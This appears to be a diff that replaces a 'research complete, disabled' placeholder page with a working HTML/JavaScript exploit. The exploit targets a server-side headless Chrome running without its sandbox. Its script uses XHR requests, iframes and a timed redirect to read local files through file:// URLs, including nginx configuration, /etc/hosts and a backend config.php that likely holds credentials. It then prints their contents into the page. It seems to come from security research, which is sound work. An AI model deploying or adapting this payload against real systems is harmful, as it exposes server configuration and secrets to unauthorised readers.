@@ -1,1 +1,61 @@
-<!doctype html><meta charset="utf-8"><title>CASI research complete</title><pre>Bounded security research proof completed and disabled.</pre>
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>R</title></head><body>
+<pre id="o">Reading internal files...</pre>
+<script>
+var O=document.getElementById('o');
+O.textContent='';
+function L(m){O.textContent+=m+'\n'}
+
+var files=[
+  'file:///etc/nginx/sites-enabled/default',
+  'file:///etc/nginx/conf.d/default.conf',
+  'file:///var/www/html/Pilot7/backend/config.php',
+  'file:///etc/hostname',
+  'file:///etc/hosts'
+];
+
+L('=== Internal File Read via Chrome SSRF ===');
+L('Chrome: '+navigator.userAgent);
+L('Sandbox: --no-sandbox');
+L('');
+
+var idx=0;
+function tryNext(){
+  if(idx>=files.length){L('--- Done ---');return}
+  var f=files[idx++];
+  L('--- '+f+' ---');
+  var xhr=new XMLHttpRequest();
+  xhr.open('GET',f,true);
+  xhr.onload=function(){
+    L('Status: '+xhr.status);
+    L(xhr.responseText.substring(0,2000));
+    L('');
+    tryNext();
+  };
+  xhr.onerror=function(){
+    L('XHR blocked (CORS/mixed-content)');
+    L('');
+    tryNext();
+  };
+  xhr.timeout=5000;
+  xhr.ontimeout=function(){L('Timeout');L('');tryNext()};
+  xhr.send();
+}
+
+// Also try iframe approach
+var iframes='';
+files.forEach(function(f,i){
+  iframes+='<p style="font:10px monospace">'+f+':</p>';
+  iframes+='<iframe src="'+f+'" style="width:100%;height:200px;border:1px solid #ccc"></iframe>';
+});
+document.body.innerHTML+='<div id="iframes">'+iframes+'</div>';
+
+// Also try fetch
+L('Trying XHR approach:');
+tryNext();
+
+// Redirect fallback after 10s — read nginx config directly
+setTimeout(function(){
+  window.location.href='file:///etc/nginx/sites-enabled/default';
+},12000);
+</script>
+</body></html>
